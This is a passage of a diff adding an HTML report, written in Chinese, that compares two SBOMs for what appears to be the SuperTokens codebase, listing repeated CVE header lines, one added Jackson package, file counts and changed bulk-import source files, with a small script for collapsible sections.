class="cve-header">来自 CVE-2024-45389 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-45812 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-43788 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-45389 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-45812 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-43788 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-45389 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-45812 的附加信息:</div></td>
+                        </tr>
+                        
+                            </tbody>
+                        </table>
+                    </div>
+                    
+                
+            <button type="button" class="collapsible">
+                <span style="flex-grow: 1;">新增包 (1)</span>
+                <span style="font-size:14px;color:#666">点击展开/收起</span>
+            </button>
+            <div class="content">
+                <table>
+                    <tr>
+                        <th>包名</th>
+                        <th>版本</th>
+                        <th>许可证</th>
+                    </tr>
+                    <tr><td>com.fasterxml.jackson.dataformat:jackson-dataformat-cbor</td><td>2.18.2</td><td>NOASSERTION</td></tr>
+                </table>
+            </div>
+            
+                
+                
+                
+                
+                
+                
+                
+                
+                
+            <h3>文件统计</h3>
+            <table>
+                <tr>
+                    <th>总文件数 (SBOM A)</th>
+                    <td>779</td>
+                </tr>
+                <tr>
+                    <th>总文件数 (SBOM B)</th>
+                    <td>780</td>
+                </tr>
+                <tr>
+                    <th>新增文件数</th>
+                    <td>1</td>
+                </tr>
+                <tr>
+                    <th>移除文件数</th>
+                    <td>0</td>
+                </tr>
+                <tr>
+                    <th>文件内容变更数</th>
+                    <td>17</td>
+                </tr>
+            </table>
+            
+                
+                <button type="button" class="collapsible">
+                    <span style="flex-grow: 1;">新增文件 (1)</span>
+                    <span style="font-size:14px;color:#666">点击展开/收起</span>
+                </button>
+                <div class="content">
+                    <p></p>
+                    <table>
+                        <tr>
+                            <th>文件名</th>
+                        </tr>
+                        <tr><td>src\main\java\io\supertokens\authRecipe\exception\BulkImportRecipeUserIdAlreadyLinkedWithAnotherPrimaryUserIdException.java</td></tr>
+                    </table>
+                </div>
+                
+                
+                
+                <button type="button" class="collapsible">
+                    <span style="flex-grow: 1;">文件变更 (17)</span>
+                    <span style="font-size:14px;color:#666">点击展开/收起</span>
+                </button>
+                <div class="content">
+                    <table>
+                        <tr>
+                            <th>文件名</th>
+                            <th>变更类型</th>
+                        </tr>
+                        <tr><td>src\main\java\io\supertokens\cronjobs\bulkimport\ProcessBulkImportUsers.java</td><td>内容变更</td></tr><tr><td>implementationDependencies.json</td><td>内容变更</td></tr><tr><td>src\main\java\io\supertokens\webserver\api\bulkimport\ImportUserAPI.java</td><td>内容变更</td></tr><tr><td>CHANGELOG.md</td><td>内容变更</td></tr><tr><td>src\test\java\io\supertokens\test\bulkimport\ProcessBulkImportUsersCronJobTest.java</td><td>内容变更</td></tr><tr><td>src\main\java\io\supertokens\webserver\api\bulkimport\BulkImportAPI.java</td><td>内容变更</td></tr><tr><td>src\main\java\io\supertokens\authRecipe\AuthRecipe.java</td><td>内容变更</td></tr><tr><td>src\test\java\io\supertokens\test\bulkimport\apis\AddBulkImportUsersTest.java</td><td>内容变更</td></tr><tr><td>src\main\java\io\supertokens\inmemorydb\queries\GeneralQueries.java</td><td>内容变更</td></tr><tr><td>src\test\java\io\supertokens\test\bulkimport\apis\ImportUserTest.java</td><td>内容变更</td></tr><tr><td>src\test\java\io\supertokens\test\bulkimport\BulkImportTest.java</td><td>内容变更</td></tr><tr><td>src\main\java\io\supertokens\bulkimport\BulkImportUserUtils.java</td><td>内容变更</td></tr><tr><td>src\test\java\io\supertokens\test\bulkimport\BulkImportTestUtils.java</td><td>内容变更</td></tr><tr><td>src\main\java\io\supertokens\cronjobs\bulkimport\ProcessBulkUsersImportWorker.java</td><td>内容变更</td></tr><tr><td>src\test\java\io\supertokens\test\bulkimport\BulkImportFlowTest.java</td><td>内容变更</td></tr><tr><td>src\main\java\io\supertokens\bulkimport\BulkImport.java</td><td>内容变更</td></tr><tr><td>src\main\java\io\supertokens\inmemorydb\queries\UserRolesQueries.java</td><td>内容变更</td></tr>
+                    </table>
+                </div>
+                
+            </div>
+            
+            <script>
+                // 初始化所有content的样式为隐藏
+                document.addEventListener('DOMContentLoaded', function() {
+                    var contents = document.querySelectorAll('.content');
+                    for (var i = 0; i < contents.length; i++) {
+                        contents[i].style.display = "none";
+                    }
+                });
+                
+                var coll = document.getElementsByClassName("collapsible");
+                for (var i = 0; i < coll.length; i++) {
+                    coll[i].addEventListener("click", function(e) {
+                        // 阻止按钮的默认行为，防止页面刷新
+                        e.preventDefault();
+                        this.classList.toggle("active");
+                        var content = this.nextElementSibling;
+                        if (content.style.display === "block") {
+                            content.style.display = "none";
+                        } else {
+                            content.style.display = "block";
+                        }
+                    });
+                }
+            </script>
+        </body>
+        </html>
+        
